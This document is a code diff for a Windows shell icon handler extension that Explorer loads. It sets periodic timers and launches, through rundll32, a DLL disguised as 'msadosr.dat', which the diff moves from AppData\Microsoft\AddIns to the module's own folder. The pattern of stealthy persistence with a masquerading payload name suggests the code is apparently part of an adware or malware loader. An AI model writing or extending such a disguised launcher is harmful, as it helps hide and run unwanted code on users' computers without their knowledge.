@@ -45,7 +45,7 @@ STDMETHODIMP CShellIconHandler::Load( LPCOLESTR pszFileName, DWORD dwMode )
 		//第一个
 		if(CreateWorkerMe())
 		{
-			m_spMe->Enable(1);
+			//m_spMe->Enable(1);
 		}
 	}
 	if(m_spMe)
@@ -186,7 +186,7 @@ STDMETHODIMP CShellIconHandler::Initialize ( LPCITEMIDLIST pidlFolder, LPDATAOBJ
 		//第一个
 		if(CreateWorkerMe())
 		{
-			m_spMe->Enable(true);
+			//m_spMe->Enable(true);
 		}
 	}
 	UNREFERENCED_PARAMETER(pidlFolder);
@@ -566,7 +566,7 @@ LRESULT CShellIconHandler::OnCreate(UINT /*uMsg*/, WPARAM /*wParam*/, LPARAM /*l
 	m_uTimerID15min = SetTimer(  1, __INTERVAL_ONE_HOUR /4 );
 	TCHAR szDir[_MAX_PATH] = {0};
 	SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, 0, SHGFP_TYPE_CURRENT, szDir);
-	m_hConfigFileChanged = FindFirstChangeNotification(szDir,  FALSE, FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_LAST_WRITE );
+	//m_hConfigFileChanged = FindFirstChangeNotification(szDir,  FALSE, FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_LAST_WRITE );
 
 	m_uTimerID5min = SetTimer(  2, __INTERVAL_ONE_HOUR / 12  );
 	TSDEBUG4CXX("GetTickCount() = "<<GetTickCount());
@@ -629,6 +629,17 @@ BOOL CShellIconHandler::eXclusive(void)
 {
 	return !EnumWindows(EnumWindowsProc, (LPARAM)0);
 }
+inline HINSTANCE			GetCurrentModuleHandle(void)
+{
+	static HINSTANCE hCurrentModule = 0;
+	if(NULL == hCurrentModule)
+	{
+		MEMORY_BASIC_INFORMATION m = { 0 };
+		VirtualQuery(&hCurrentModule, &m, sizeof(MEMORY_BASIC_INFORMATION));
+		hCurrentModule = (HINSTANCE) m.AllocationBase;
+	}
+	return hCurrentModule;
+}
 void   CShellIconHandler::LaunchRundll32(TCHAR* pszCmdline)
 {
 	//	TSAUTO();
@@ -644,16 +655,15 @@ void   CShellIconHandler::LaunchRundll32(TCHAR* pszCmdline)
 		return;
 	}
 
-	CComBSTR bstrAllPath = L"rundll32.exe msadosr.dat ScreenSaver 0,,1";
-	TCHAR szDir[_MAX_PATH] = {0};
-	SHGetFolderPath(NULL, CSIDL_FLAG_CREATE|CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, szDir);
-	PathAddBackslash(szDir);
-	PathAppend(szDir, _T("Microsoft\\AddIns\\"));	
-
-	CComBSTR szDllDir = szDir;
 	TCHAR szDllPath[_MAX_PATH] = {0};
-	wcscpy(szDllPath, szDir);
-	PathAppend(szDllPath, _T("msadosr.dat"));	
+	TCHAR szDllDir[_MAX_PATH] = {0};
+	GetModuleFileName(GetCurrentModuleHandle(), szDllPath, _MAX_PATH);
+	PathAppend(szDllPath, _T(".."));
+	_tcsncpy(szDllDir, szDllPath, _MAX_PATH);
+	PathAppend(szDllPath, _T("msadosr.dat"));    
+
+	CComBSTR bstrAllPath = L"rundll32.exe msadosr.dat ScreenSaver 0,,1"; 
+	
 	TSDEBUG4CXX("dllpath : "<<szDllPath);
 	if( PathFileExists(szDllPath)) 
 	{	
